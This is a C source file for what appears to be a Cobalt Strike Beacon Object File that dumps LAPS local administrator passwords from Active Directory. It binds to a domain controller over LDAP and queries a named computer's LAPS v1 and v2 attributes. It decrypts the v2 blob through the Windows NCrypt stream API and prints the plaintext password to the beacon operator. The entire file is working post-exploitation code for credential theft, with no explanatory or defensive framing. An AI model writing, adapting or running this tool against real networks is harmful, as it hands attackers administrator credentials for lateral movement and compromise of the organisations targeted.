#include <windows.h>
#include <winldap.h>
#include <winber.h>
#include "beacon.h"

DECLSPEC_IMPORT void*  WINAPI MSVCRT$malloc(size_t n);
DECLSPEC_IMPORT void   WINAPI MSVCRT$free(void* p);
DECLSPEC_IMPORT void*  WINAPI MSVCRT$memcpy(void* dst, const void* src, size_t n);
DECLSPEC_IMPORT void*  WINAPI MSVCRT$memset(void* dst, int c, size_t n);
DECLSPEC_IMPORT int    WINAPI MSVCRT$_snprintf(char* buf, size_t n, const char* fmt, ...);

DECLSPEC_IMPORT LDAP*        WINAPI WLDAP32$ldap_init(PCHAR host, ULONG port);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_set_option(LDAP* ld, int opt, const void* val);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_connect(LDAP* ld, LDAP_TIMEVAL* tv);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_bind_s(LDAP* ld, PCHAR dn, PCHAR cred, ULONG method);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_search_s(LDAP* ld, PCHAR base, ULONG scope,
                                                            PCHAR filter, PCHAR* attrs,
                                                            ULONG attrsonly, LDAPMessage** res);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_count_entries(LDAP* ld, LDAPMessage* res);
DECLSPEC_IMPORT LDAPMessage* WINAPI WLDAP32$ldap_first_entry(LDAP* ld, LDAPMessage* res);
DECLSPEC_IMPORT struct berval** WINAPI WLDAP32$ldap_get_values_len(LDAP* ld, LDAPMessage* entry, PCHAR attr);
DECLSPEC_IMPORT PCHAR*       WINAPI WLDAP32$ldap_get_values(LDAP* ld, LDAPMessage* entry, PCHAR attr);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_value_free_len(struct berval** vals);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_value_free(PCHAR* vals);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_msgfree(LDAPMessage* res);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_unbind_s(LDAP* ld);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$LdapGetLastError(void);
DECLSPEC_IMPORT PCHAR        WINAPI WLDAP32$ldap_err2string(ULONG err);

typedef ULONG_PTR NCRYPT_STREAM_HANDLE;

typedef LONG (WINAPI *PFNCryptStreamOutputCallback)(
    void*        pvCallbackCtxt,
    const BYTE*  pbData,
    SIZE_T       cbData,
    BOOL         fFinal);

typedef struct _NCRYPT_PROTECT_STREAM_INFO {
    PFNCryptStreamOutputCallback pfnStreamOutput;
    void*                        pvCallbackCtxt;
} NCRYPT_PROTECT_STREAM_INFO;

typedef LONG (WINAPI *NCryptStreamOpenToUnprotect_t)(
    NCRYPT_PROTECT_STREAM_INFO* pStreamInfo,
    DWORD                       dwFlags,
    HWND                        hWnd,
    NCRYPT_STREAM_HANDLE*       phStream);

typedef LONG (WINAPI *NCryptStreamUpdate_t)(
    NCRYPT_STREAM_HANDLE hStream,
    const BYTE*          pbData,
    SIZE_T               cbData,
    BOOL                 fFinal);

typedef LONG (WINAPI *NCryptStreamClose_t)(
    NCRYPT_STREAM_HANDLE hStream);

#ifndef NCRYPT_SILENT_FLAG
#define NCRYPT_SILENT_FLAG 0x00000040
#endif

#pragma pack(push, 1)
typedef struct {
    unsigned int upperdate;
    unsigned int lowerdate;
    unsigned int encryptedBufferSize;
    unsigned int flags;
} LAPS_BLOB_HEADER;
#pragma pack(pop)

static void bof_ldap_perror(const char* ctx, ULONG err) {
    PCHAR msg = WLDAP32$ldap_err2string(err);
    BeaconPrintf(CALLBACK_ERROR, "[-] %s: (0x%lx) %s",
                 ctx, err, msg ? msg : "unknown");
}

static LONG WINAPI decryptCallback(
    void*        pvCallbackCtxt,
    const BYTE*  pbData,
    SIZE_T       cbData,
    BOOL         fFinal)
{
    (void)pvCallbackCtxt;
    (void)cbData;
    (void)fFinal;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Decrypted LAPS Password: %ls",
                 (const wchar_t*)pbData);
    return 0;
}

static BOOL unprotectSecret(BYTE* blob, ULONG blobLen) {
    HMODULE hNcrypt = LoadLibraryA("ncrypt.dll");
    if (!hNcrypt) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to load ncrypt.dll");
        return FALSE;
    }

    NCryptStreamOpenToUnprotect_t pOpen =
        (NCryptStreamOpenToUnprotect_t)GetProcAddress(hNcrypt, "NCryptStreamOpenToUnprotect");
    NCryptStreamUpdate_t pUpdate =
        (NCryptStreamUpdate_t)GetProcAddress(hNcrypt, "NCryptStreamUpdate");
    NCryptStreamClose_t pClose =
        (NCryptStreamClose_t)GetProcAddress(hNcrypt, "NCryptStreamClose");

    if (!pOpen || !pUpdate || !pClose) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to resolve NCryptStream functions");
        FreeLibrary(hNcrypt);
        return FALSE;
    }

    NCRYPT_PROTECT_STREAM_INFO streamInfo;
    streamInfo.pfnStreamOutput = decryptCallback;
    streamInfo.pvCallbackCtxt  = NULL;

    NCRYPT_STREAM_HANDLE hStream = 0;
    LONG status;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Decrypting LAPS v2 blob...");

    status = pOpen(&streamInfo, NCRYPT_SILENT_FLAG, 0, &hStream);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] NCryptStreamOpenToUnprotect failed: 0x%lx", status);
        FreeLibrary(hNcrypt);
        return FALSE;
    }

    status = pUpdate(hStream,
                     blob    + sizeof(LAPS_BLOB_HEADER),
                     blobLen - sizeof(LAPS_BLOB_HEADER),
                     TRUE);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] NCryptStreamUpdate failed: 0x%lx", status);
        pClose(hStream);
        FreeLibrary(hNcrypt);
        return FALSE;
    }

    pClose(hStream);
    FreeLibrary(hNcrypt);
    return TRUE;
}

void go(char* args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    char* domainController = BeaconDataExtract(&parser, NULL);
    char* rootDN           = BeaconDataExtract(&parser, NULL);
    char* computerName     = BeaconDataExtract(&parser, NULL);

    if (!domainController || domainController[0] == '\0') {
        BeaconPrintf(CALLBACK_ERROR, "[!] domainController is required");
        return;
    }
    if (!rootDN || rootDN[0] == '\0') {
        BeaconPrintf(CALLBACK_ERROR, "[!] rootDN is required");
        return;
    }
    if (!computerName || computerName[0] == '\0') {
        BeaconPrintf(CALLBACK_ERROR, "[!] computerName is required");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target DC   : %s", domainController);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Base DN     : %s", rootDN);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Computer    : %s", computerName);

    LDAP* ld = WLDAP32$ldap_init(domainController, 389);
    if (!ld) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ldap_init failed (err=%lu)",
                     WLDAP32$LdapGetLastError());
        return;
    }

    ULONG ver = LDAP_VERSION3;
    WLDAP32$ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &ver);

    ULONG rc = WLDAP32$ldap_connect(ld, NULL);
    if (rc != LDAP_SUCCESS) {
        bof_ldap_perror("ldap_connect", rc);
        WLDAP32$ldap_unbind_s(ld);
        return;
    }

    rc = WLDAP32$ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (rc != LDAP_SUCCESS) {
        bof_ldap_perror("ldap_bind_s", rc);
        WLDAP32$ldap_unbind_s(ld);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] LDAP bind successful");

    char filter[512];
    MSVCRT$_snprintf(filter, sizeof(filter),
                     "(|(sAMAccountName=%s)(sAMAccountName=%s$))",
                     computerName, computerName);

    char* attrs[] = {
        "msLAPS-EncryptedPassword",
        "ms-Mcs-AdmPwd",
        NULL
    };

    LDAPMessage* searchResult = NULL;
    rc = WLDAP32$ldap_search_s(ld, rootDN, LDAP_SCOPE_SUBTREE,
                                filter, attrs, 0, &searchResult);
    if (rc != LDAP_SUCCESS) {
        bof_ldap_perror("ldap_search_s", rc);
        WLDAP32$ldap_unbind_s(ld);
        return;
    }

    ULONG entryCount = WLDAP32$ldap_count_entries(ld, searchResult);
    if (entryCount == 0) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] No entry found for computer '%s' under '%s'",
                     computerName, rootDN);
        WLDAP32$ldap_msgfree(searchResult);
        WLDAP32$ldap_unbind_s(ld);
        return;
    }

    LDAPMessage* entry = WLDAP32$ldap_first_entry(ld, searchResult);
    if (!entry) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ldap_first_entry returned NULL");
        WLDAP32$ldap_msgfree(searchResult);
        WLDAP32$ldap_unbind_s(ld);
        return;
    }

    struct berval** bvals =
        WLDAP32$ldap_get_values_len(ld, entry, "msLAPS-EncryptedPassword");

    if (bvals && bvals[0] && bvals[0]->bv_len > sizeof(LAPS_BLOB_HEADER)) {
        ULONG  blobLen = (ULONG)bvals[0]->bv_len;
        BYTE*  blob    = (BYTE*)MSVCRT$malloc(blobLen);

        if (!blob) {
            BeaconPrintf(CALLBACK_ERROR, "[!] malloc failed");
            WLDAP32$ldap_value_free_len(bvals);
            WLDAP32$ldap_msgfree(searchResult);
            WLDAP32$ldap_unbind_s(ld);
            return;
        }

        MSVCRT$memcpy(blob, bvals[0]->bv_val, blobLen);
        WLDAP32$ldap_value_free_len(bvals);
        WLDAP32$ldap_msgfree(searchResult);
        WLDAP32$ldap_unbind_s(ld);

        LAPS_BLOB_HEADER* hdr = (LAPS_BLOB_HEADER*)blob;
        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] LAPS v2 Blob Header:");
        BeaconPrintf(CALLBACK_OUTPUT, "    Upper Date Timestamp : %u", hdr->upperdate);
        BeaconPrintf(CALLBACK_OUTPUT, "    Lower Date Timestamp : %u", hdr->lowerdate);
        BeaconPrintf(CALLBACK_OUTPUT, "    Encrypted Buffer Size: %u", hdr->encryptedBufferSize);
        BeaconPrintf(CALLBACK_OUTPUT, "    Flags                : %u", hdr->flags);

        if (hdr->encryptedBufferSize != blobLen - sizeof(LAPS_BLOB_HEADER)) {
            BeaconPrintf(CALLBACK_ERROR,
                         "[!] Header size (%u) vs actual payload (%lu) mismatch - decryption may fail",
                         hdr->encryptedBufferSize,
                         (unsigned long)(blobLen - sizeof(LAPS_BLOB_HEADER)));
        }

        if (!unprotectSecret(blob, blobLen)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to decrypt LAPS v2 password");
        }

        MSVCRT$free(blob);
        return;
    }

    if (bvals) {
        WLDAP32$ldap_value_free_len(bvals);
    }

    PCHAR* svals = WLDAP32$ldap_get_values(ld, entry, "ms-Mcs-AdmPwd");
    if (svals && svals[0]) {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] LAPS v1 (plaintext) Password: %s", svals[0]);
        WLDAP32$ldap_value_free(svals);
        WLDAP32$ldap_msgfree(searchResult);
        WLDAP32$ldap_unbind_s(ld);
        return;
    }
    if (svals) {
        WLDAP32$ldap_value_free(svals);
    }

    BeaconPrintf(CALLBACK_ERROR,
                 "[!] Computer found but no LAPS attribute present.\n"
                 "    Either LAPS is not enabled for this machine, or\n"
                 "    the current account lacks read permission.");

    WLDAP32$ldap_msgfree(searchResult);
    WLDAP32$ldap_unbind_s(ld);
}
